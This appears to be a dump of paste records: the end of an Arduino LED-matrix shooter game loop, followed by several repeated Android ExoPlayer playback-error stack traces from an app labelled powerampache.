      // Button is newly pressed
      ssright++;
      ssleft++;
      rightButtonActive = true;
    } else if (currentstate_right == HIGH) {
      // Button is released
      rightButtonActive = false;
    }
  }
  lastRightState = currentstate_right;

  // Shoot button with improved handling
  if (currentstate_shoot != lastShootState) {
    lastDebounceTimeShoot = millis();
  }

  if ((millis() - lastDebounceTimeShoot) > debounceDelay) {
    // Only fire when button is first pressed, not while held
    if (currentstate_shoot == LOW && !shootButtonPressed) {
      fireBullet();
      shootButtonPressed = true;

    } else if (currentstate_shoot == HIGH) {
      shootButtonPressed = false;
    }
  }
  lastShootState = currentstate_shoot;

  if (score % reduceTime == 0) {
    EnemyMoveInterval -= difficultyFactor * score;
    enemyCooldown -= difficultyFactor1 * score;
    reduceTime += 10;
  }

  // Update and draw active bullets
  drawspaceship();

  updateEnemies();

  // Draw spaceship
  spawnEnemies();
  updateBullets();
  displayBinary(score);

  // Update LED matrix
  setLEDColors(colors);
  FastLED.show();
  updateMusic();
  delay(20);  // Faster refresh rate for smoother movement
}"
yrt3PDvf,2025-04-20T16:56:41.090,powerampache,PHP,Sunday 20th of April 2025 09:56:42 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762493538,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
Msy8Z8ik,2025-04-20T16:56:40.859,powerampache,PHP,Sunday 20th of April 2025 09:56:42 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762493303,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
4zXS2DdY,2025-04-20T16:56:40.584,powerampache,PHP,Sunday 20th of April 2025 09:56:41 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762493029,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
p9ZaQ8uY,2025-04-20T16:56:40.086,powerampache,PHP,Sunday 20th of April 2025 09:56:41 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762492523,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
gQn2aHvQ,2025-04-20T16:56:39.792,powerampache,PHP,Sunday 20th of April 2025 09:56:41 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762492222,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
SkjNxuLY,2025-04-20T16:56:39.539,powerampache,PHP,Sunday 20th of April 2025 09:56:40 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":29},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762491990,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
eCXdPtQT,2025-04-20T16:56:36.367,powerampache,PHP,Sunday 20th of April 2025 09:56:39 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":27},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762488812,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source 